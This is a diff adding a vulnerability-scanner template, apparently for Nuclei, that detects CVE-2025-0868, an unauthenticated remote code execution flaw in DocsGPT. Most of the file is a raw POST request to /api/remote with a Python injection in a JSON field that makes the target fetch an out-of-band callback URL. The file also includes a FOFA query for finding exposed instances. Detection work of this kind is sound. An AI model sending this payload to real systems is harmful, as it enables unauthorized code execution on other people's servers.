@@ -1,0 +1,44 @@
+id: docsgpt-api-remote-unauth-rce
+
+info:
+  name: DocsGPT - Unauthenticated Remote Code Execution
+  author: iamnoooob,rootxharsh,pdresearch
+  severity: critical
+  description: DocsGPT是一个AI驱动的文档助手，基于GPT技术，用于智能搜索和解析技术文档，帮助开发者快速获取API说明、代码示例和问题解答。
+  reference:
+    - https://cert.pl/posts/2025/02/CVE-2025-0868/
+    - https://cert.pl/en/posts/2025/02/CVE-2025-0868/
+    - https://github.com/arc53/DocsGPT
+    - https://github.com/lal0ne/vulnerability/blob/bc7f5a98350b329b839a0a0b3a9ce60efd05e0e9/DocsGPT/CVE-2025-0868/CVE-2025-0868.yaml#L4
+  classification:
+    epss-score: 0.00045
+    epss-percentile: 0.17965
+  metadata:
+    verified: true
+    version: 0.8.1 <= DocsGPT <= 0.12.0
+    fofa-query: body="Welcome to DocsGPT"
+  tags: cve,cve2025,docsgpt,unauth,rce,oob
+
+http:
+  - raw:
+      - |
+        POST /api/remote HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        user=1&source=reddit&name=other&data={"source":"reddit","client_id":"1111","client_secret":1111,"user_agent":"111","search_queries":[""],"number_posts":10,"rce\\\\":__import__('requests').get('http://{{interactsh-url}}/')}#":11}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
+
+      - type: word
+        part: body
+        words:
+          - '"task_id":'
+          - '"status":'
+        condition: and
+# digest: 4a0a00473045022100e4b9033d7ceae721ebab8d404ca39eb9f06821ba212c9fe7630e6d2812c14d19022031170adf167f1572146c1439af874fc90e8cc1b6e39d3b669d9910229968c8ec:922c64590222798bb761d5b6d8e72950
